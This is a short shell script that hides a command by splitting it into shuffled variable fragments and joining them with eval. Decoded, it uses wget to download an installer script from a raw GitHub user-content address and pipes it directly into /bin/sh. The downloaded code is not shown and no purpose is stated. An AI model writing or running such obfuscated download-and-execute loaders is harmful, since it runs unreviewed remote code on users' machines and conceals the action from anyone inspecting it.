z="
";Wz='in/s';Tz='h -q';Oz='agi/';Gz='serc';Iz='nt.c';Bz=' htt';Lz='37/c';Hz='onte';Sz='er.s';Uz='O - ';Jz='om/e';Qz='/ins';Kz='mil2';Ez='.git';Cz='ps:/';Fz='hubu';Az='wget';Pz='main';Nz='el-n';Vz='| /b';Dz='/raw';Mz='hann';Xz='h';Rz='tall';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"